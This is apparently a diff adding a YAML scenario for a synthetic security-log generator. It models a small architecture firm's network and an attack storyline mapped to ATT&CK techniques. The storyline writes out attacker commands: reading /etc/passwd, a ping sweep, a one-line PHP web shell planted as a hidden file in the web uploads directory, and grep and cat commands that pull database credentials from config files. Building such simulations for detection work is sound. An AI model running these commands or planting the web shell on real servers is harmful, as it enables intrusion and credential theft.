@@ -1,0 +1,330 @@
+version: "1.0"
+name: arch-firm-ssh-bruteforce
+description: "Small architecture firm with SSH brute force attack against Linux web server followed by internal reconnaissance"
+
+environment:
+  description: "Small architecture firm (12 employees) with mixed Windows/Linux infrastructure, public-facing web server, and internal file shares"
+
+  users:
+    # Partners
+    - username: r.nakamura
+      full_name: "Reiko Nakamura"
+      email: "reiko.nakamura@delvecchio-arch.com"
+      persona: executive
+      primary_system: WS-DESIGN-01
+      enabled: true
+
+    - username: m.delvecchio
+      full_name: "Marco DelVecchio"
+      email: "marco.delvecchio@delvecchio-arch.com"
+      persona: executive
+      primary_system: WS-DESIGN-02
+      enabled: true
+
+    # Senior Architects
+    - username: j.okafor
+      full_name: "James Okafor"
+      email: "james.okafor@delvecchio-arch.com"
+      persona: analyst
+      primary_system: WS-DESIGN-03
+      enabled: true
+
+    - username: s.lindqvist
+      full_name: "Sofia Lindqvist"
+      email: "sofia.lindqvist@delvecchio-arch.com"
+      persona: analyst
+      primary_system: WS-DESIGN-04
+      enabled: true
+
+    # Junior Architects
+    - username: p.gutierrez
+      full_name: "Pablo Gutierrez"
+      email: "pablo.gutierrez@delvecchio-arch.com"
+      persona: analyst
+      primary_system: WS-DESIGN-03
+      enabled: true
+
+    - username: a.johal
+      full_name: "Amrit Johal"
+      email: "amrit.johal@delvecchio-arch.com"
+      persona: analyst
+      primary_system: WS-DESIGN-04
+      enabled: true
+
+    # Office Manager
+    - username: t.brennan
+      full_name: "Theresa Brennan"
+      email: "theresa.brennan@delvecchio-arch.com"
+      persona: executive
+      primary_system: WS-ADMIN-01
+      enabled: true
+
+    # IT Contractor (part-time)
+    - username: d.pham
+      full_name: "Derek Pham"
+      email: "derek.pham@delvecchio-arch.com"
+      persona: developer
+      primary_system: WS-ADMIN-01
+      enabled: true
+
+    # Threat actor (uses compromised/guessed local account)
+    - username: webadmin
+      full_name: "Web Admin"
+      email: "webadmin@delvecchio-arch.com"
+      enabled: true
+
+  systems:
+    # Design workstations
+    - hostname: WS-DESIGN-01
+      ip: 192.168.10.101
+      os: "Windows 11"
+      type: workstation
+      assigned_user: r.nakamura
+
+    - hostname: WS-DESIGN-02
+      ip: 192.168.10.102
+      os: "Windows 11"
+      type: workstation
+      assigned_user: m.delvecchio
+
+    - hostname: WS-DESIGN-03
+      ip: 192.168.10.103
+      os: "Windows 11"
+      type: workstation
+      assigned_user: j.okafor
+
+    - hostname: WS-DESIGN-04
+      ip: 192.168.10.104
+      os: "Windows 11"
+      type: workstation
+      assigned_user: s.lindqvist
+
+    # Admin workstation
+    - hostname: WS-ADMIN-01
+      ip: 192.168.10.110
+      os: "Windows 10"
+      type: workstation
+      assigned_user: t.brennan
+
+    # Domain controller
+    - hostname: DC-01
+      ip: 192.168.20.1
+      os: "Windows Server 2019"
+      type: domain_controller
+
+    # File server
+    - hostname: FILE-SRV-01
+      ip: 192.168.20.10
+      os: "Windows Server 2019"
+      type: server
+      services: ["SMB", "DFS"]
+
+    # Web server (public-facing portfolio site)
+    - hostname: WEB-SRV-01
+      ip: 192.168.20.20
+      os: "Ubuntu 22.04 LTS"
+      type: server
+      services: ["Apache", "SSH", "PHP"]
+
+  network:
+    segments:
+      - name: office_lan
+        cidr: "192.168.10.0/24"
+        description: "Office workstation network"
+        systems: [WS-DESIGN-01, WS-DESIGN-02, WS-DESIGN-03, WS-DESIGN-04, WS-ADMIN-01]
+      - name: server_dmz
+        cidr: "192.168.20.0/24"
+        description: "Server network and DMZ"
+        systems: [DC-01, FILE-SRV-01, WEB-SRV-01]
+    sensors:
+      - type: network
+        name: core-switch-tap
+        monitoring_segments: [office_lan, server_dmz]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek_conn, zeek_dns]
+        description: "Core switch SPAN port monitoring all internal traffic"
+      - type: ids
+        name: perimeter-ids
+        monitoring_segments: [server_dmz]
+        direction: inbound
+        placement: tap
+        log_formats: [snort_alert]
+        description: "Perimeter IDS monitoring inbound traffic to DMZ"
+
+personas:
+  - name: executive
+    description: "Firm partners and office management handling business operations"
+    typical_activities:
+      - "Review project proposals and client correspondence"
+      - "Email communication with clients and contractors"
+      - "Access shared project files on file server"
+    work_hours: "8am-6pm (lunch 12pm-1pm)"
+    application_usage: ["Microsoft Office", "Chrome", "Adobe Acrobat"]
+    risk_profile: "low"
+
+  - name: analyst
+    description: "Architects using CAD software and project management tools"
+    typical_activities:
+      - "CAD design work in AutoCAD and Revit"
+      - "Review building specifications and codes"
+      - "Collaborate on shared project files"
+    work_hours: "9am-6pm (lunch 12:30pm-1:30pm)"
+    application_usage: ["AutoCAD", "Revit", "Chrome", "Bluebeam"]
+    risk_profile: "medium"
+
+  - name: developer
+    description: "IT contractor managing infrastructure and web server"
+    typical_activities:
+      - "SSH to web server for maintenance"
+      - "Update website content and plugins"
+      - "Monitor system health and backups"
+    work_hours: "9am-5pm"
+    application_usage: ["PuTTY", "PowerShell", "Chrome", "FileZilla"]
+    risk_profile: "high"
+
+time_window:
+  start: "2024-03-12T12:00:00Z"
+  duration: "8h"
+
+baseline_activity:
+  description: "Normal weekday operations at a small architecture firm. Partners arrive early, architects work mid-morning through evening. Steady web traffic to portfolio site from prospective clients. IT contractor checks in remotely in the afternoon."
+  intensity: medium
+  variation: medium
+
+output:
+  logs:
+    - format: windows_event_security
+    - format: zeek_conn
+    - format: zeek_dns
+    - format: ecar
+    - format: syslog
+    - format: bash_history
+    - format: snort_alert
+    - format: web_access
+  destination: "./output"
+  compression: false
+
+storyline:
+  # Phase 1: SSH Brute Force against web server (external attacker)
+  - time: "2024-03-12T14:15:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "SSH brute force attack against web server from external IP"
+    details:
+      technique: "T1110.001 - Brute Force: Password Guessing"
+      description: "Attacker launches SSH brute force against public-facing web server"
+      source_ip: "45.33.32.156"
+      dst_port: 22
+
+  # Phase 2: Initial access - successful SSH login
+  - time: "2024-03-12T14:22:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Successful SSH login after brute force with compromised credentials"
+    details:
+      technique: "T1078.003 - Valid Accounts: Local Accounts"
+      description: "Attacker gains access using guessed credentials for www-data service account"
+      source_ip: "45.33.32.156"
+      dst_port: 22
+
+  # Phase 3: Local reconnaissance
+  - time: "2024-03-12T14:23:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'whoami' to identify current user context"
+    details:
+      technique: "T1033 - System Owner/User Discovery"
+      command: "whoami"
+
+  - time: "2024-03-12T14:23:30Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'id' to enumerate groups and privileges"
+    details:
+      technique: "T1033 - System Owner/User Discovery"
+      command: "id"
+
+  - time: "2024-03-12T14:24:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'uname -a' to fingerprint operating system"
+    details:
+      technique: "T1082 - System Information Discovery"
+      command: "uname -a"
+
+  - time: "2024-03-12T14:25:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'cat /etc/passwd' to enumerate local accounts"
+    details:
+      technique: "T1087.001 - Account Discovery: Local Account"
+      command: "cat /etc/passwd"
+
+  - time: "2024-03-12T14:26:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'netstat -tulpn' to discover listening services"
+    details:
+      technique: "T1049 - System Network Connections Discovery"
+      command: "netstat -tulpn"
+
+  - time: "2024-03-12T14:27:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'ip addr' to identify network interfaces"
+    details:
+      technique: "T1016 - System Network Configuration Discovery"
+      command: "ip addr"
+
+  # Phase 4: Network discovery
+  - time: "2024-03-12T14:29:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Execute 'arp -a' to view ARP cache for local network hosts"
+    details:
+      technique: "T1018 - Remote System Discovery"
+      command: "arp -a"
+
+  - time: "2024-03-12T14:30:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Ping sweep of 192.168.20.0/24 subnet to discover active hosts"
+    details:
+      technique: "T1018 - Remote System Discovery"
+      command: "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.20.$i; done"
+
+  # Phase 5: Web shell deployment
+  - time: "2024-03-12T14:35:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Deploy PHP web shell to Apache document root for persistent access"
+    details:
+      technique: "T1505.003 - Server Software Component: Web Shell"
+      command: "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/uploads/.info.php"
+      description: "Simple PHP web shell hidden in uploads directory"
+
+  - time: "2024-03-12T14:36:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Test web shell functionality via curl"
+    details:
+      technique: "T1505.003 - Server Software Component: Web Shell"
+      command: "curl http://localhost/uploads/.info.php?cmd=id"
+
+  # Phase 6: Credential harvesting from web server configs
+  - time: "2024-03-12T14:38:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Search Apache and PHP configuration for database credentials"
+    details:
+      technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+      command: "grep -r password /var/www/html/ /etc/apache2/ 2>/dev/null"
+
+  - time: "2024-03-12T14:40:00Z"
+    actor: webadmin
+    system: WEB-SRV-01
+    activity: "Read wp-config.php to extract database credentials"
+    details:
+      technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+      command: "cat /var/www/html/wp-config.php"
